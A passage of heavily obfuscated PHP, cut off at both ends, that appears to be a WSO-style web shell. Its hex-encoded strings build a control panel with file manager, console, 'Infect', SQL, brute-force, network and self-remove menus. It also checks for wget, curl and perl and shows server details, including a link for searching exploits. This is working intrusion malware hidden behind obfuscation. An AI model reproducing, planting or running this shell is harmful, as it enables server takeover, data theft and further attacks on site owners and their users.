\x61\x6d\x79\x72\x67v"]}="";${"\x47L\x4f\x42A\x4c\x53"}["\x6a\x64gy\x66\x77oib"]="\x6d";foreach(${${"\x47LO\x42\x41L\x53"}["\x79\x7af\x69\x70r\x6ct\x71"]} as${${"GL\x4f\x42\x41L\x53"}["\x79p\x63\x63u\x67"]})${${"\x47\x4cOB\x41L\x53"}["\x68xz\x66\x61my\x72\x67\x76"]}.="<op\x74i\x6f\x6e v\x61l\x75e=\"".${${"GL\x4f\x42\x41\x4cS"}["\x6a\x78\x77\x69\x76vx\x68\x70l\x74x"]}."\"\x20".($_POST["ch\x61r\x73\x65\x74"]==${$gllfevcbhe}?"sel\x65\x63\x74\x65d":"").">".${${"\x47\x4cO\x42\x41L\x53"}["\x64\x68\x6f\x76\x66\x70\x72p"]}."</o\x70t\x69o\x6e>";${${"\x47LOBA\x4c\x53"}["f\x64lxnm\x75"]}=array("Se\x63.\x20\x49nfo"=>"S\x65\x63\x49n\x66o","File\x73"=>"\x46i\x6cesMa\x6e","\x43o\x6e\x73ol\x65"=>"Con\x73o\x6c\x65","I\x6efe\x63t"=>"\x49nfect","S\x71l"=>"\x53q\x6c","P\x68p"=>"Php","S\x61fe \x6d\x6f\x64e"=>"\x53\x61\x66\x65\x4dod\x65","St\x72i\x6e\x67 \x74\x6f\x6f\x6cs"=>"\x53tr\x69ngTo\x6fls","Brut\x65forc\x65"=>"B\x72\x75t\x65forc\x65","\x4e\x65\x74w\x6fr\x6b"=>"Net\x77\x6f\x72k","\x44oma\x69\x6es"=>"\x44\x6fm\x61\x69\x6es");if(!empty($GLOBALS["\x61\x75th_\x70\x61s\x73"]))${${"GL\x4f\x42\x41L\x53"}["\x6adg\x79\x66\x77o\x69\x62"]}["\x4cog\x6fu\x74"]="\x4c\x6fgout";${${"\x47LO\x42\x41\x4cS"}["f\x64\x6c\x78\x6e\x6du"]}["S\x65\x6cf\x20\x72\x65m\x6fv\x65"]="\x53\x65l\x66Remo\x76\x65";${$fxikgnyxdwe}="";foreach(${${"\x47\x4cO\x42AL\x53"}["\x66\x64\x6cx\x6e\x6du"]} as${${"G\x4c\x4f\x42A\x4c\x53"}["v\x70\x62\x66\x78\x63m"]}=>${${"GL\x4f\x42\x41\x4cS"}["dn\x6er\x6b\x6a\x75\x73\x6a"]})${${"\x47L\x4fB\x41\x4c\x53"}["nc\x62i\x6c\x78zf\x63"]}.="\x3c\x74\x68 \x77idth=\x22".(int)(100/count(${${"\x47\x4cOBA\x4cS"}["fdl\x78n\x6d\x75"]}))."\x25\"\x3e[ \x3ca\x20\x68\x72ef\x3d\x22\x23\" \x6fn\x63l\x69\x63k\x3d\"g('".${${"\x47LO\x42\x41\x4c\x53"}["\x71\x6b\x71\x68c\x73ur\x65\x6a\x71"]}."',\x6e\x75\x6c\x6c,'\x27,\x27\x27,\x27')\x22>".${${"\x47\x4c\x4fB\x41\x4c\x53"}["v\x70b\x66\x78\x63\x6d"]}."\x3c/a>\x20]\x3c/\x74h>";${${"GLOB\x41LS"}["\x6b\x6dr\x6a\x66u\x78\x69"]}="";if($GLOBALS["o\x73"]=="\x77i\x6e"){${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x68\x72myj\x6d\x62d\x72\x62\x72"]="\x64ri\x76\x65";foreach(range("\x61","\x7a")as${${"G\x4c\x4f\x42AL\x53"}["\x68\x72my\x6am\x62\x64\x72\x62r"]}){$eljoxbhsli="dr\x69\x76\x65s";$zwwycent="d\x72ive";$spwnhtil="\x64\x72\x69ve";if(is_dir(${$spwnhtil}.":\\"))${$eljoxbhsli}.="<a \x68\x72\x65\x66\x3d\x22\x23\x22 \x6f\x6e\x63li\x63k=\"\x67(\x27F\x69le\x73\x4dan\x27,\x27".${$zwwycent}.":/\x27)\x22\x3e[ ".${${"\x47L\x4f\x42\x41\x4cS"}["qrlslub\x6d"]}." ]\x3c/a\x3e ";}}function showstat($stat){if(${${"\x47LOB\x41L\x53"}["\x6fv\x6dm\x6b\x76hi\x66"]}=="\x6f\x6e"){return"\x3cb\x3e\x3c\x66on\x74 \x73\x74\x79\x6c\x65\x3d'c\x6f\x6c\x6f\x72:lim\x65\x27\x3eON</\x66\x6fn\x74\x3e\x3c/\x62\x3e";}else{return"<\x62><\x66o\x6e\x74\x20\x73t\x79\x6c\x65\x3d\x27\x63\x6flo\x72:re\x64\x27\x3eO\x46\x46</fo\x6e\x74></b\x3e";}}${"\x47\x4c\x4fB\x41\x4c\x53"}["\x76\x68c\x73\x6a\x77\x69\x79\x77\x76"]="d\x72i\x76\x65s";$rqqidcoh="m\x65\x6eu";function hdd($s){$pisxryurbdzd="\x73";$hlwwhok="\x73";${"G\x4c\x4fBALS"}["\x68\x77o\x69\x67\x6ag\x72gh\x6d"]="s";$vxifewuw="s";${"\x47L\x4f\x42A\x4c\x53"}["\x6dr\x77xy\x74fl\x63\x70\x6a"]="s";if(${$pisxryurbdzd}>=1073741824)return sprintf("\x251\x2e2f",${${"\x47\x4c\x4fBA\x4c\x53"}["\x68w\x6f\x69g\x6agrg\x68\x6d"]}/1073741824)." \x47B";elseif(${${"G\x4cO\x42\x41\x4cS"}["\x71\x68jr\x78ia\x69k"]}>=1048576)return sprintf("\x251\x2e2f",${$vxifewuw}/1048576)." M\x42";elseif(${$hlwwhok}>=1024)return sprintf("\x251\x2e2\x66",${${"\x47\x4c\x4fB\x41\x4c\x53"}["m\x72\x77\x78\x79\x74\x66\x6c\x63\x70\x6a"]}/1024)."\x20\x4b\x42";else return${${"\x47L\x4f\x42A\x4cS"}["\x71\x68j\x72xi\x61\x69k"]}."\x20B";}function testmysql(){if(function_exists("\x6d\x79s\x71\x6c_co\x6e\x6e\x65\x63t")){return showstat("on");}else{return showstat("\x6fff");}}function testcurl(){if(function_exists("cur\x6c\x5f\x76\x65\x72\x73\x69on")){return showstat("on");}else{return showstat("off");}}function testwget(){if(ex("\x77\x67\x65\x74\x20--h\x65\x6c\x70")){return showstat("\x6fn");}else{return showstat("o\x66f");}}function testperl(){if(ex("\x70\x65rl -h")){return showstat("on");}else{return showstat("off");}}echo"\x3cs\x70\x61n c\x6cas\x73=\x69n\x66o\x3e\x26\x6ebs\x70\x3b\x4d\x79\x53Q\x4c:\x20".testmysql()."&\x6e\x62\x73p;|\x26n\x62\x73\x70\x3bPe\x72\x6c:\x20".testperl()."\x26\x6e\x62s\x70\x3b|&n\x62s\x70;cUR\x4c: ".testcurl()."\x26n\x62\x73p\x3b|&\x6e\x62sp\x3bWGe\x74:\x20".testwget()."\x3c\x62r>";echo"<t\x61b\x6ce\x20\x63l\x61ss\x3di\x6efo\x20cellpaddin\x67=3 c\x65\x6cls\x70\x61c\x69ng=\x30\x20\x77\x69d\x74h=\x310\x30%\x3e\x3c\x74r\x3e<\x74\x64 w\x69\x64\x74h=1\x3e\x3c\x73\x70\x61\x6e\x3eU\x6e\x61m\x65:<b\x72>Use\x72:<br\x3e\x50\x68p:\x3c\x62\x72\x3e\x48\x64\x64:<br>\x43\x77d:".($GLOBALS["o\x73"]=="\x77i\x6e"?"<br\x3eD\x72\x69ve\x73:":"")."\x3c/\x73p\x61n\x3e</t\x64\x3e"."<td><\x6eo\x62r\x3e".substr(@php_uname(),0,120)." \x20\x3ca\x20\x68\x72ef=\x22h\x74tp://\x77ww\x2e\x67\x6f\x6fgl\x65.c\x6fm/s\x65\x61r\x63h?q=".urlencode(@php_uname())."\"\x20ta\x72get\x3d\"\x5fb\x6cank\x22\x3e[\x47\x6f\x6fgle]\x3c/\x61>\x20<\x61 h\x72\x65f\x3d\"".${$ysosfpjxfpo}."\" \x74a\x72\x67\x65\x74=_\x62lank\x3e[\x45\x78\x70loit-Git]\x3c/a\x3e\x3c/\x6e\x6fbr\x3e\x3cb\x72>".${${"G\x4cO\x42\x41L\x53"}["wq\x6ao\x62ycg\x6cp"]}." ( ".${$rguvcyt}." )\x20\x3c\x73\x70a\x6e\x3eG\x72ou\x70:</\x73\x70an\x3e ".${${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x66\x6agb\x61\x69"]}."\x20(\x20".${${"GL\x4fB\x41\x4cS"}["l\x6c\x70y\x6ar\x66\x74"]}." )\x3c\x62\x72\x3e".@phpversion()." <\x73\x70an\x3eSa\x66e mod\x65:</span\x3e ".($GLOBALS["\x73a\x66e\x5f\x6d\x6f\x64\x65"]?"\x3c\x66o\x6e\x74 \x63\x6f\x6cor\x3d\x72\x65d\x3e\x4f\x4e\x3c/\x66on\x74>":"\x3cfont\x20c\x6flo\x72\x3d\x23\x300A\x38A8>\x3c\x62\x3eOFF</\x62\x3e</f\x6fn\x74>")."\x20<\x61 \x68\x72\x65\x66=\x23 \x6fn\x63\x6cic\x6b=\"\x67(\x27P\x68\x70',\x6e\x75l\x6c,\x6eull,'i\x6e\x66o')\x22\x3e[ p\x68p\x69nf\x6f ]</\x61\x3e \x3c\x73\x70\x61n\x3eD\x61\x74eti\x6de:</s\x70a\x6e>\x20".date("Y-\x6d-d\x20\x48:\x69:s")."\x3cbr>".viewSize(${${"G\x4c\x4f\x42\x41\x4cS"}["jrm\x79\x61\x73g\x73\x69\x67\x75\x66"]})."\x20<span>Fr\x65e:\x3c/s\x70\x61\x6e\x3e\x20".viewSize(${$pggbwyx})." (".(int)(${${"\x47\x4cOB\x41\x4c\x53"}["\x63\x6f\x69y\x74\x75\x6c\x6e\x71"]}/${${"G\x4c\x4f\x42AL\x53"}["\x6a\x72my\x61\x73\x67s\x69\x67\x75\x66"]}*100)."%)\x3c\x62r\x3e".${${"\x47\x4c\x4f\x42AL\x53"}["\x67\x64\x74\x62j\x71"]}."\x20".viewPermsColor($GLOBALS["\x63w\x64"])."\x20<a h\x72ef=# \x6fnc\x6c\x69\x63\x6b\x3d\"\x67('F\x69les\x4d\x61\x6e','".$GLOBALS["\x68\x6f\x6de\x5f\x63wd"]."\x27,'','\x27,\x27\x27)\x22\x3e[ \x68\x6fm\x65\x20]\x3c/\x61><\x62r\x3e".${${"\x47LO\x42\x41L\x53"}["\x76\x68\x63\x73j\x77i\x79w\x76"]}."\x3c/\x74\x64\x3e"."\x3c\x74\x64 \x77idt\x68=\x31 \x61\x6ci\x67\x6e\x3d\x72ight\x3e\x3cnobr>\x3c\x73\x65l\x65\x63\x74\x20\x6fn\x63\x68\x61ng\x65\x3d\x22\x67(nu\x6c\x6c,n\x75ll,\x6e\x75l\x6c,\x6eull,n\x75ll,t\x68\x69s\x2eva\x6c\x75\x65)\"\x3e\x3coptgro\x75\x70\x20\x6c\x61\x62el\x3d\x22Pa\x67e\x20c\x68a\x72s\x65\x74\x22\x3e".${$nxmsbsl}."\x3c/\x6fptgr\x6f\x75\x70>\x3c/se\x6c\x65ct>\x3cb\x72\x3e<\x73\x70\x61n\x3e\x53\x65r\x76e\x72\x20\x49\x50:\x3c/sp\x61n\x3e\x3c\x62r\x3e".gethostbyname($_SERVER["\x48T\x54P_\x48\x4fST"])."\x3cbr\x3e\x3c\x73pan>C\x6c\x69e\x6e\x74\x20I\x50:\x3c/sp\x61\x6e\x3e<\x62r>".$_SERVER["\x52EM\x4f\x54\x45_A\x44\x44\x52"]."\x3c/nobr></\x74d\x3e</\x74r>\x3c/t\x61\x62l\x65\x3e"."<\x74a\x62le\x20\x63\x65\x6cl\x70\x61\x64di\x6eg=3 cel\x6cspaci\x6eg\x3d\x30\x20\x77\x69\x64\x74\x68=1\x300\x25\x20\x73t\x79le=\"ba\x63\x6b\x67r\x6f\x75nd-co\x6cor:t\x65\x61\x6c\x3b\x22\x3e\x3c\x74r>".${$rqqidcoh}."\x3c/t\x72\x3e</\x74\x61ble\x3e<\x64i\x76>";}function printFooter(){$cgmvurhwgfct="is\x5f\x77\x72\x69\x74\x61b\x6c\x65";${$cgmvurhwgfct}=is_writable($GLOBALS["cwd"])?"\x3cfo\x6e\x74 col\x6f\x72\x3d\x74e\x61l\x3e[\x20\x57ri\x74e\x61b\x6ce\x20]\x3c/font>":"\x3cfo\x6e\x74 colo\x72\x3d\x72ed>[ No\x74\x20w\x72i\x74a\x62l\x65\x20]</fo\x6et>";echo "</d\x69v>\n\x3ctable cla\x73s\x3di\x6e\x66\x6f i\x64\x3dto\x6f\x6c\x